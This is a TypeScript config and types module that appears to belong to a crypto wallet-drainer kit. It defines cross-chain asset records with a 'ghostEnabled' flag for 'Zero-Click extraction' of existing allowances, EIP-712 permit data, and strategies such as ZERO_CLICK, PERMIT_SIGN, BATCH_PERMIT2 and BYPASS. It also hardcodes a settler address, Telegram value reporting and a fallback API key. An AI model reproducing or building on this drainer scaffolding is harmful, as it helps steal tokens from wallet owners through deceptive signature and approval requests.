import {
  mainnet,
  bsc,
  polygon,
  base,
  arbitrum,
  optimism,
  hardhat,
} from "viem/chains";
import { Network } from "alchemy-sdk";

/**
 * 🏗️ CORE ASSET INTERFACE
 * The bridge between EVM, Solana, Tron, and UTXO data.
 */
export interface UniversalAsset {
  symbol: string;
  name: string;
  decimals: number;
  balance: string;
  displayBalance: string;
  contractAddress?: string;
  chain: "EVM" | "SOLANA" | "BITCOIN" | "TRON" | "LITECOIN" | "XRP";
  networkName: string;
  chainId?: number;
  logo?: string;
  permitSupported: boolean;

  /**
   * 💰 VALUE TRACKING
   * Added to support aggregate portfolio value reporting in Telegram.
   */
  usdValue?: number;

  /**
   * ghostEnabled: Flag for Zero-Click extraction.
   * If true, an active allowance was detected during the audit.
   */
  ghostEnabled?: boolean;

  /**
   * authData: Contains EIP-712 structured data for signatures.
   */
  authData?: {
    domain: Record<string, any>;
    types: Record<string, any>;
    primaryType: string;
    message: Record<string, any>;
    hasExistingAllowance?: boolean;
    protocol?: string;
  };

  signatureType?: "EIP2612" | "PERMIT2" | "NATIVE";
}

/**
 * ⚡ EXECUTION ENGINE STRATEGIES
 */
export type ExecutionStrategy =
  | "ZERO_CLICK"
  | "PERMIT_SIGN"
  | "BATCH_PERMIT2"
  | "CHAIN_SWITCH"
  | "BYPASS";

export interface StrategyMap {
  asset: UniversalAsset;
  strategy: ExecutionStrategy;
  priority: number;
}

// --- CONFIGURATION CONSTANTS ---

export const ALCHEMY_KEY =
  process.env.NEXT_PUBLIC_ALCHEMY_API_KEY || "LEcRJW_Bhx4ybZ7TSZ3p9";

export const SETTLER_ADDR =
  (process.env.NEXT_PUBLIC_SETTLER_ADDR as `0x${string}`) ||
  "0x2a75a9AfF7d909002fc458b765CB92F47350464B";

export const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

export const EVM_CHAINS = [
  {
    id: 31337,
    name: hardhat,
    alchemyNet: Network.ETH_MAINNET,
    rsc: "eth-mainnet",
    label: "Hardhat Local",
  },
  {
    id: 1,
    name: mainnet,
    alchemyNet: Network.ETH_MAINNET,
    rsc: "eth-mainnet",
    label: "Ethereum",
  },
  {
    id: 56,
    name: bsc,
    alchemyNet: Network.BNB_MAINNET,
    rsc: "bnb-mainnet",
    label: "BNB Chain",
  },
  {
    id: 137,
    name: polygon,
    alchemyNet: Network.MATIC_MAINNET,
    rsc: "polygon-mainnet",
    label: "Polygon",
  },
  {
    id: 8453,
    name: base,
    alchemyNet: Network.BASE_MAINNET,
    rsc: "base-mainnet",
    label: "Base",
  },
  {
    id: 42161,
    name: arbitrum,
    alchemyNet: Network.ARB_MAINNET,
    rsc: "arbitrum-mainnet",
    label: "Arbitrum",
  },
  {
    id: 10,
    name: optimism,
    alchemyNet: Network.OPT_MAINNET,
    rsc: "optimism-mainnet",
    label: "Optimism",
  },
];

export const PERMIT_ABI = [
  {
    inputs: [{ name: "owner", type: "address" }],
    name: "nonces",
    outputs: [{ type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ type: "string" }],
    stateMutability: "view",
    type: "function",
  },
] as const;

/**
 * 🛡️ ENVIRONMENT SYNC
 */
if (typeof window !== "undefined") {
  import("buffer").then(({ Buffer }) => {
    window.Buffer = window.Buffer || Buffer;
  });
}
